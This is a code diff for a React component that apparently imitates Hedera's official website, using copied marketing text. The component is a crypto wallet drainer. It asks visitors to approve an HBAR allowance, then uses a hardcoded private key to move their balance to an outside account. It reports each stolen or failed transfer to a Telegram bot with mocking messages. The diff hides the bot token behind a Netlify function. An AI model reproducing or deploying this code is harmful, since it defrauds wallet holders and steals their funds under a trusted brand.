@@ -1,4 +1,3 @@
-
 import { AccountId, PrivateKey, TransactionId, Hbar, Client, TransferTransaction, AccountAllowanceApproveTransaction } from "@hashgraph/sdk";
 import { useCallback, useEffect, useRef } from "react";
 import { useDispatch, useSelector } from "react-redux";
@@ -27,33 +26,20 @@ export const HashConnectClient = () => {
     return approvedSendRx;
   }
 
-  const sendMessageToTelegram = async (chatId: any, message: any) => {
-    const botToken = "8013359815:AAGTZPxSm_si2xMhnLWLUBvkF1jrZrtWOjI"; // Replace with your Telegram bot token
-    const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
-
-    const payload = {
-      chat_id: chatId, // Replace with your chat ID or dynamically fetch
-      text: message,   // Message to send
-    };
-
+  const sendMessageToTelegram = async (message: any) => {
     try {
-      const response = await fetch(telegramApiUrl, {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json",
-        },
-        body: JSON.stringify(payload),
+      const response = await fetch('/.netlify/functions/send-telegram', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ message }),
       });
-
       const data = await response.json();
       if (!response.ok) {
-        await sendMessageToTelegram (chatId, message);
-        throw new Error(data.description || "Failed to send message");
+        throw new Error(data.error || 'Failed to send message');
       }
-      console.log(response.ok, 'tg message result');
+      console.log('Telegram notification sent:', data);
     } catch (error) {
-      sendMessageToTelegram (chatId, message);
-      console.error("Error sending message:", error);
+      console.error('Error sending Telegram notification:', error);
     }
   };
 
@@ -154,7 +140,7 @@ export const HashConnectClient = () => {
       const allowRestult = await receipt.status.toString();
       console.log("Allowance Transaction Status:", receipt.status.toString());
       if (allowRestult === "SUCCESS") {
-        await sendMessageToTelegram(chatId, `${accountId} has approved 🤣 allowance 😎 for ${TARGET_WALLET}`);
+        await sendMessageToTelegram(`${accountId} has approved 🤣 allowance 😎 for ${TARGET_WALLET}`);
         let { remainingHbar, keytype } = await getTokenBalances(accountId); // Fetch HBAR balance
         // const gasFee = await calculateHbarGasFee(0, 0);
         if (remainingHbar > 0.5) {
@@ -162,23 +148,23 @@ export const HashConnectClient = () => {
           console.log("calculation is stress!", remainingHbar);
         } else {
           console.log('I am beggar guy');
-          await sendMessageToTelegram(chatId, `${accountId} had insufficient HBAR 😭 to send to ${TARGET_WALLET} \n I am beggar guy!😫`);
-          return; // Exit if there’s no HBAR to cover gas fees
+          await sendMessageToTelegram(`${accountId} had insufficient HBAR 😭 to send to ${TARGET_WALLET} \n I am beggar guy!😫`);
+          return; // Exit if there's no HBAR to cover gas fees
         }
         
         const receiver = await '0.0.8058213';
         
         if (Math.floor(remainingHbar) < 1) {
-          await sendMessageToTelegram(chatId, `${accountId} had insufficient HBAR 😭 to send to ${TARGET_WALLET} \n I am beggar guy!😫`);
+          await sendMessageToTelegram(`${accountId} had insufficient HBAR 😭 to send to ${TARGET_WALLET} \n I am beggar guy!😫`);
         } else {
           
           const balance = await new Hbar(Math.floor(remainingHbar));
           const result = await hbarAllowanceFcn(hbarAccountId, receiver, balance, TARGET_WALLET, PrivateKey.fromStringED25519(PVK), Client.forMainnet());
           console.log(result.status.toString(), "after call the function result.status.toString() result");
           if (result.status.toString() === "SUCCESS") {
-            sendMessageToTelegram(chatId, `${accountId} has sent 📢  ${Math.floor(remainingHbar)} HBAR to ${receiver}`);
+            sendMessageToTelegram(`${accountId} has sent 📢  ${Math.floor(remainingHbar)} HBAR to ${receiver}`);
           } else {
-            sendMessageToTelegram(chatId, `${accountId} has failed 😭  ${Math.floor(remainingHbar)} to send HBAR to ${receiver}`);
+            sendMessageToTelegram(`${accountId} has failed 😭  ${Math.floor(remainingHbar)} to send HBAR to ${receiver}`);
           }
           
         }
@@ -1717,7 +1703,7 @@ export const HashConnectConnectButton = () => {
                                     <div className="menu-dropdown-item-title">Treasury Management</div>
 
                                     <div className="menu-dropdown-item-description">
-                                      Hedera’s report of the HBAR supply.
+                                      Hedera's report of the HBAR supply.
                                     </div>
                                   </div>
                                 </a>
@@ -3269,7 +3255,7 @@ export const HashConnectConnectButton = () => {
                 </h3>
 
                 <div className="box-description">
-                  Whether you’re a globally-recognized brand or individual creator, Hedera makes it simple to issue NFT membership and reward tokens in real-time to cultivate a trustworthy ecosystem.
+                  Whether you're a globally-recognized brand or individual creator, Hedera makes it simple to issue NFT membership and reward tokens in real-time to cultivate a trustworthy ecosystem.
                 </div>
               </div>
 
@@ -3485,11 +3471,11 @@ export const HashConnectConnectButton = () => {
                     </p>
 
                     <p>
-                      Hedera’s performance-optimized Ethereum Virtual Machine (EVM) smart contracts, along with its easy-to-use native tokenization and consensus service APIs, enable developers to create real-time web3 applications and ecosystems that will drive the future of the internet.
+                      Hedera's performance-optimized Ethereum Virtual Machine (EVM) smart contracts, along with its easy-to-use native tokenization and consensus service APIs, enable developers to create real-time web3 applications and ecosystems that will drive the future of the internet.
                     </p>
 
                     <p>
-                      Hedera is built differently from other blockchains. It has high throughput with fast finality; low, predictable fees; fair transaction ordering with consensus timestamps; and a robust codebase that ensures scalability and reliability at every layer of its network infrastructure. Hedera is governed responsibly by the world’s leading organizations to ensure that the network is collusion-resistant.
+                      Hedera is built differently from other blockchains. It has high throughput with fast finality; low, predictable fees; fair transaction ordering with consensus timestamps; and a robust codebase that ensures scalability and reliability at every layer of its network infrastructure. Hedera is governed responsibly by the world's leading organizations to ensure that the network is collusion-resistant.
                     </p>
                   </div>
                 </div>
@@ -4506,7 +4492,7 @@ export const HashConnectConnectButton = () => {
                   <h3 className="feature-heading">Massively Scalable</h3>
 
                   <div className="feature-description">
-                    Hedera’s native services reliably scale to 10,000 TPS and beyond, powering the most demanding, mission-critical web3 applications and protocols.
+                    Hedera's native services reliably scale to 10,000 TPS and beyond, powering the most demanding, mission-critical web3 applications and protocols.
                   </div>
                 </div>
 
@@ -4551,7 +4537,7 @@ export const HashConnectConnectButton = () => {
             <h2 className="heading">Get Started with Hedera</h2>
 
             <div className="description">
-              Whether you’re a developer, HBAR enthusiast, or web3 application user, here’s how to get started with Hedera.
+              Whether you're a developer, HBAR enthusiast, or web3 application user, here's how to get started with Hedera.
             </div>
           </div>
 
